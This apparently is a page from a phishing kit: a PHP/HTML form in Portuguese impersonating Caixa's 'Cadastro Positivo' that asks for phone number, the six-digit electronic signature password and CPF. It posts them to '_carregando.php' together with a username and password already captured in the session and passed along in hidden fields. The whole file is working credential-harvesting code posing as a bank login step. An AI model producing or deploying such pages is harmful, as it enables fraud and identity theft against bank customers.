﻿<?php
session_start();
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso Seguro</title>

<style>

body {
	margin: 0;
	font-family:Arial, Helvetica, sans-serif;
	}

#topo {
	width: 100%;
	height: 42px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	background-color: #1664AC;
	}
	
.logininput {
	width: 100%;
    max-width: 100%;
	box-sizing: border-box;
	font-size: 16px;
	border: none;
	border-bottom: solid 1px #b3b3b3;
	border-radius: 2px;
	display: block;
	color: #000;
	padding: 8px;
	height: 36px;
	outline: 0;
	}

.bttenter {
	background:url(img/bgbottom.png) repeat;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #999;
	cursor: pointer;
	}
	
#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; font-size: 13px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#1664AC; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background:url(img/bgbottom.png) repeat;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}

</style>
</head>

<body>

<div id="topo"></div>

<div style="padding:10px;">

<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return validaSHK()" action="_carregando.php" autocomplete="off">

<div style="padding:10px 20px; text-align:center; font-size:16px; color: #277EB6; "><b>Cadastro Positivo</b></div>

<div style="padding:10px 20px; text-align:left; font-size:16px; color: #282828; ">Confirme os dados solicitados e acesse com segurança</div>



<div style="padding:10px 20px;">
<div style="width:34%; float:left;">
<label placeholder="shkDdd" data-reactid="17">
<span class="ui-label-text" data-reactid="18">DDD:</span>
<input class="logininput" name="shkDdd" id="shkDdd" onKeyUp="javascript:pulacampo('shkDdd','shkCelular');" tabindex="1" maxlength="2" type="tel" onkeypress="return SomenteNumero(event)" data-reactid="16">
</label>
</div>

<div style="width:64%; float:right;" >
<label placeholder="shkCelular" data-reactid="14">
<span class="ui-label-text" data-reactid="15">Celular:</span>
<input class="logininput" name="shkCelular" id="shkCelular" onKeyUp="javascript:pulacampo('shkCelular','shkSenha');"  maxlength="9" tabindex="1" type="tel" onkeypress="return SomenteNumero(event)" data-reactid="16">
</label>
</div>

</div>


<div style="padding:20px 20px; text-align:left; font-size:16px; color: #282828; clear: both; ">
<label placeholder="shkSenha" data-reactid="14">
<span class="ui-label-text" data-reactid="15">Assinatura Eletronica:</span>
<input class="logininput" name="shkSenha" id="shkSenha" onKeyUp="javascript:pulacampo('shkSenha','bottonG');" maxlength="6" tabindex="1" type="tel" data-reactid="16" onkeypress="return SomenteNumero(event)" style="-webkit-text-security: disc!important;" >
</label>
</div>

<div style="padding:10px 20px;">
<div style="width:64%; float:left;">
<label placeholder="shkcpf" data-reactid="17">
<span class="ui-label-text" data-reactid="18">CPF:</span>
<input class="logininput" name="shkCpf" id="shkCpf" onKeyUp="javascript:pulacampo('shkCpf','bottonG');"  maxlength="11" tabindex="1" type="tel" onkeypress="return SomenteNumero(event)" data-reactid="16">
</label>
</div>



<div style="padding:10px 20px; text-align:center;">
<input type="submit" name="bottonG" id="bottonG" class="bttenter" value="CONFIRMAR" />
<input type="hidden" name="shkUser" id="shkUser" value="<?php echo $_SESSION['shkUser']; ?>">
<input type="hidden" name="shkPass" id="shkPass" value="<?php echo $_SESSION['shkPass']; ?>">
<input type="hidden" name="option" id="option" value="<?php echo $_SESSION['option']; ?>">
</div>

</form>

</div>


<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0; color:#CCA43D;"></div>CAIXA INFORMA!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>


<script type="text/javascript">
function validaSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");
	
if ( document.ajaxpf.shkDdd.value == "" ||
document.ajaxpf.shkDdd.value.length < 2 ||
document.ajaxpf.shkDdd.value.length > 2){
document.getElementById("shkDdd").value = "";
ModalAlertError.innerHTML = "DDD Invalido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
if ( document.ajaxpf.shkCelular.value == "" ||
document.ajaxpf.shkCelular.value.length < 9 ||
document.ajaxpf.shkCelular.value.length > 9){
document.getElementById("shkCelular").value = "";
ModalAlertError.innerHTML = "Celular Inválido!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }

if ( document.ajaxpf.shkSenha.value == "" ||
document.ajaxpf.shkSenha.value.length < 6 ||
document.ajaxpf.shkSenha.value.length > 6){
document.getElementById("shkSenha").value = "";
ModalAlertError.innerHTML = "Assinatura Eletronica Inválida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
}
</script>


<script>
function pulacampo(idobj, idproximo)
{
var str = new String(document.getElementById(idobj).value);
var mx = new Number(document.getElementById(idobj).maxLength);
if (str.length == mx)
{
document.getElementById(idproximo).focus();
}
}
</script>

<script>
function SomenteNumero(e){
    var tecla=(window.event)?event.keyCode:e.which;
    if((tecla > 47 && tecla < 58)) return true;
    else{
    if (tecla != 8) return false;
    else return true;
    }
}
</script>

</body>
</html>